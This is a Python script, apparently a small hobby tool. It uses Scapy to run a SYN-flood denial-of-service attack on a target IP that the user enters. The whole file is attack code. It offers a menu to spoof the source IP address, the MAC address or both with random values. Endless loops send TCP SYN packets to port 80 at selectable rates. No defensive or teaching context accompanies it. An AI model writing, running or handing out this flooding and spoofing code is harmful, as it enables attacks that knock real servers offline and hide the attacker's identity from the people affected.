
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether


def randomip():
    ip = ""
    for i in range(3):
        n = random.randint(0, 255)
        ip = ip + str(n) + "."
    n = random.randint(0, 255)
    ip = ip + str(n)
    return ip


def randommac():
    Mac = "00:24:81:"
    for i in range(2):
        n = random.randint(10,99)
        Mac = Mac + str(n) + ":"
    n = random.randint(10, 99)
    Mac = Mac + str(n)
    return Mac


def randomport():
    return random.randint(1024, 65000)


mode = int(input("This program launch a DOS attack on a specific target\nEnter 1 to have nothing spoofed\nEnter 2 to "
                 "spoof "
                 "your IP\nEnter 3 to spoof your MAC Address\nEnter 4 to spoof your MAC Address and IP\n"))
if mode == 1:
    destIP = input("Enter the IP address of the target")
    T = input(
        "Enter 1T for 1 packet each 0.01sec\nEnter 2T for 1 packet each 0.1 sec\nEnter 3T for 1 packet each 1 "
        "sec\nEnter 4T for 1 packet each 5 sec\n")
    if T == "1T":
        while True:
            sendp(Ether() / IP(dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'), inter=0.01)
    elif T == "2T":
        while True:
            sendp(Ether() / IP(dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'), inter=0.1)
    elif T == "3T":
        while True:
            sendp(Ether() / IP(dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'), inter=1)
    elif T == "4T":
        while True:
            sendp(Ether() / IP(dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'), inter=5)
    else:
        print("There is no such speed")

elif mode == 2:
    destIP = input("Enter the IP address of the target")
    T = input(
        "Enter 1T for 1 packet each 0.01sec\nEnter 2T for 1 packet each 0.1 sec\nEnter 3T for 1 packet each 1 "
        "sec\nEnter 4T for 1 packet each 5 sec\n")
    if T == "1T":
        while True:
            sendp(Ether() / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
                  inter=0.01)
    elif T == "2T":
        while True:
            sendp(Ether() / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
                  inter=0.1)
    elif T == "3T":
        while True:
            sendp(Ether() / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
                  inter=1)
    elif T == "4T":
        while True:
            sendp(Ether() / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
                  inter=5)
    else:
        print("There is no such speed")

elif mode == 3:
    destIP = input("Enter the IP address of the target")
    T = input(
        "Enter 1T for 1 packet each 0.01sec\nEnter 2T for 1 packet each 0.1 sec\nEnter 3T for 1 packet each 1 "
        "sec\nEnter 4T for 1 packet each 5 sec\n")
    if T == "1T":
        while True:
            sendp(Ether(src=randommac()) / IP(dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
                  inter=0.01)
    elif T == "2T":
        while True:
            sendp(Ether(src=randommac()) / IP(dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
                  inter=0.1)
    elif T == "3T":
        while True:
            sendp(Ether(src=randommac()) / IP(dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
                  inter=1)
    elif T == "4T":
        while True:
            sendp(Ether(src=randommac()) / IP(dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
                  inter=5)
    else:
        print("There is no such speed")

elif mode == 4:
    destIP = input("Enter the IP address of the target")
    T = input(
        "Enter 1T for 1 packet each 0.01sec\nEnter 2T for 1 packet each 0.1 sec\nEnter 3T for 1 packet each 1 "
        "sec\nEnter 4T for 1 packet each 5 sec\n")
    if T == "1T":
        while True:
            sendp(Ether(src=randommac()) / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80,
                                                                                flags='S'), inter=0.01)
    elif T == "2T":
        while True:
            sendp(Ether(src=randommac()) / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80,
                                                                                flags='S'), inter=0.1)
    elif T == "3T":
        while True:
            sendp(Ether(src=randommac()) / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80,
                                                                                flags='S'), inter=1)
    elif T == "4T":
        while True:
            sendp(Ether(src=randommac()) / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80,
                                                                                flags='S'), inter=5)
    else:
        print("There is no such speed")
else:
    print("There is no such menu")
